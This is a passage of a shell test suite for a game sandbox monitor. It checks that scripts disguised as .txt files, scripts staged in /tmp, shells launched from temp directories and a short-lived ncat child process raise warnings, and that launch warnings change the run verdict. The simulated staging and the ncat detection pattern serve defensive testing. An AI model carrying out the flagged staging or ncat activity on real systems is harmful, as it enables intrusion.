printf '#!/bin/sh\n' > "$NH/shebang.txt"; printf 'x' > "$NH/exec.dat"; chmod 755 "$NH/exec.dat"; printf 'just text\n' > "$NH/work/data.txt"
r="$(native_classify_path "$NH/notes.txt" CLOSE_WRITE "$NH" "$NG")";   has "exec-bit script named .txt is flagged" 'WARN.*Executable script' "$r"
r="$(native_classify_path "$NH/shebang.txt" CLOSE_WRITE "$NH" "$NG")"; has "shebang under a harmless name is flagged" 'WARN.*Script \(#! line\)' "$r"
r="$(native_classify_path "$NH/exec.dat" ATTRIB "$NH" "$NG")";         has "chmod +x (ATTRIB) on an ordinary file is flagged" 'WARN.*execute permission' "$r"
r="$(native_classify_path "$NH/work/data.txt" CLOSE_WRITE "$NH" "$NG")"; eq "plain data is not flagged" "" "$r"
# 1: the game's own /tmp (seen through /proc/<pid>/root)
cp "$NH/notes.txt" "$NR/tmp/.stage"; printf '#!x' > "$NR/tmp/.X11-unix/X0"
r="$(native_classify_path "$NR/tmp/.stage" CLOSE_WRITE "$NH" "$NG" "$NR")"; has "script in the game's /tmp is flagged as /tmp/..." 'WARN.*temp dir: /tmp/\.stage' "$r"
r="$(native_classify_path "$NR/tmp/.X11-unix/X0" CLOSE_WRITE "$NH" "$NG" "$NR")"; eq "X socket dir in /tmp is ignored" "" "$r"
r="$(native_classify_path "$NR/tmp/.stage" CLOSE_WRITE "$NH" "$NG")"; eq "without a temp prefix /tmp is not watched (host files are not the game's)" "" "$r"
# 3: shells are recognised by the kernel's name, not by argv
r="$(native_classify_proc dash helper 'helper -c /tmp/.wq-1/stage2' /usr/bin/dash '' /tmp/.wq-1 '')"; has "symlinked sh -c from a temp cwd" 'WARN.*temp directory' "$r"
r="$(native_classify_proc dash sh 'sh ./x.sh' /usr/bin/dash x.sh '' /tmp/.wq-1/x.sh)";                 has "script run from /tmp" 'WARN.*Script run from a temp directory' "$r"
r="$(native_classify_proc bash bash 'bash -c echo hi' /usr/bin/bash '' /opt/game '')";                  eq "ordinary bash -c is still nothing" "" "$r"
r="$(native_classify_proc bash bash 'bash -c /tmp/.mount_x/AppRun' /usr/bin/bash '' /opt/game '')";    eq "AppImage mount path is not a temp-dir hit" "" "$r"
# 4: a child that lives 1.5s is inspected (it used to need two polls)
gq="$(mkgame q1 native)"
: > "$gq/logs/alerts-test.log"; out="$(run_monitor "$gq" "$BIN/ncat 1.5; true")"
has "a 1.5s ncat child is caught (poll every 1s)" 'ALERT\] Suspicious process: ncat' "$out"
# 5: arbitrary writes in the private home are listed
gh="$(mkgame hd native)"; mkdir -p "$gh/home/work"; echo old > "$gh/home/work/keep.txt"
( export WQ_MONITOR_HOME="$gh/home" WQ_MONITOR_PRIVATE=1; "$Q/home-diff.sh" snapshot "$gh"
  echo x > "$gh/home/work/data.txt"; echo y >> "$gh/home/work/keep.txt"; mkdir -p "$gh/home/.cache"; echo c > "$gh/home/.cache/z"
  "$Q/home-diff.sh" compare "$gh" "$gh/logs/a.log" ) > "$T/hd.out" 2>&1
has "home diff reports other writes" 'Home diff: 1 other file\(s\) created, 1 modified' "$(cat "$T/hd.out")"
has "details name the file" 'created +~/work/data\.txt' "$(cat "$gh"/logs/homediff-*.log)"
hasnt "cache is not inventoried" '\.cache' "$(cat "$gh"/logs/homediff-*.log)"
# 6+7: launch-log warnings reach the verdict
gs="$(mkgame sm native)"; : > "$gs/logs/alerts-t.log"
printf 'Warning: NVIDIA card detected, nogroups command ignored\nwq: not hiding /mnt: x lives under it\nwq: native launch of sm (start.sh).\n' > "$gs/logs/launch-20260101-000000.log"
out="$("$Q/summarize-run.sh" "$gs" "$gs/logs/alerts-t.log" 0 2>&1)"
hasnt "launch warnings mean it is not CLEAN" 'VERDICT: CLEAN' "$out"
has "verdict is OK with launch warnings" 'VERDICT: OK, minor notes.*2 launch warning' "$out"
has "the firejail warning is listed" 'Launch warnings.*' "$out"; has "nogroups warning listed" 'nogroups command ignored' "$out"; has "mnt warning listed" 'not hiding /mnt' "$out"
has "degraded banner for an ignored setting" 'SANDBOX DEGRADED' "$out"
hasnt "progress lines are not warnings" 'native launch of' "$out"
printf '[2026-01-01 00:00:00] [INFO] Monitor coverage: 3 time(s) a child ran and exited between two polls\n' > "$gs/logs/alerts-t.log"
has "coverage gaps are in the summary" 'Monitor coverage' "$("$Q/summarize-run.sh" "$gs" "$gs/logs/alerts-t.log" 0 2>&1)"

echo
echo "$PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
